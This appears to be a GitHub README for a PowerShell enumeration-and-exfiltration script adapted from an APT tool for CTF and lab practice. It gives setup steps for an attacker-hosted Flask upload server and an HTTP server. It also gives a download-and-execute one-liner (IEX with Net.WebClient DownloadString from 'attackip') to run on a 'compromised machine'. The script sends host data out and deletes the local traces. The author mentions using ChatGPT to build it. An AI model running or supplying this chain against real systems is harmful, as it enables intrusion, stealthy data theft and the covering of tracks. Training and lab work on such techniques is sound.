# Simple Enumeration and Transfer
The script will execute, conduct light enumeration, write to appdata/roaming with the file name HOSTNAME-IPADDRESS-DATE_TIME , transfer it to your attack machine and then delete the original version.

Flask is needed for the upload server:
```
pipx install flask
```
## Steps
1. Host the upload_server.py
```
python3 upload_server.py
```
2. Edit the enum_transfer.ps1 with your IP:

![script](https://github.com/user-attachments/assets/4cf7fb55-9e63-4048-8c15-27a92ada7675)

3. Host enum_transfer.ps1 
```
python3 http.server 8000
```
4. On compromised machine, run the following
```
 IEX(New-Object Net.WebClient).DownloadString('http://attackip:8000/enum_transfer.ps1')
```

## Why?
I decided to attempt to modify a script used by an APT (seen below) to fit my training needs. As most of the machines in labs and CTF's aren't internet connected,
I wouldn't be able to exfil using Dropbox, so using ChatGPT I was able to craft this solution. If it's not apparent by the quality of the script, this
isn't my day job.

![APT Script](https://github.com/user-attachments/assets/10fffd46-ae48-4703-a636-a20e585176fa)
